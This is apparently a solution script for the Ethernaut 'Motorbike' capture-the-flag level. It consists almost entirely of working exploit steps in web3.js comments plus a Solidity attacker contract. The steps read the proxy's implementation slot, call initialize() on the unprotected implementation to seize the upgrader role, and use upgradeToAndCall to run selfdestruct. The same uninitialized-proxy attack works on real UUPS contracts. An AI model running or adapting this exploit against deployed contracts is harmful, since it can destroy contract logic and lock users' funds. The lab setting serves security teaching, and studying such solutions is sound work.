// 1 - Get the engine contract address
// implAddr = await web3.eth.getStorageAt(instance, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// implAddr = '0x' + implAddr.slice(26)

// 2 - Call `initialize()` to become the upgrader
// data = web3.eth.abi.encodeFunctionSignature("initialize()")
// await web3.eth.sendTransaction({
//     from: player,
//     to: implAddr,
//     data: data
// })

// 3 - Check that you are the upgrader
// data = web3.eth.abi.encodeFunctionSignature("upgrader()")
// await web3.eth.call({
//     to: implAddr,
//     data: data
//     })

// 4 - Create a bad contract and deploy it
pragma solidity <0.7.0;

contract MotorbikeAttacker {
    function explode() public {
        selfdestruct(payable(0));
    }
}

// badContractAddr = "0x85B8f04ae21645ED370BC1e888cb70612dda138A"
// 5 - Create the payload to be called
// data = web3.eth.abi.encodeFunctionSignature("explode()")

// upgradeToAndCallData = web3.eth.abi.encodeFunctionCall({
//     name: 'upgradeToAndCall',
//     type: 'function',
//     inputs: [{
//         type: 'address',
//         name: 'newImplementation'
//     }, {
//         type: 'bytes',
//         name: 'data'
//     }
// ]
// }, [badContractAddr, data])

// 6 - Execute self destruct
// await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeToAndCallData})
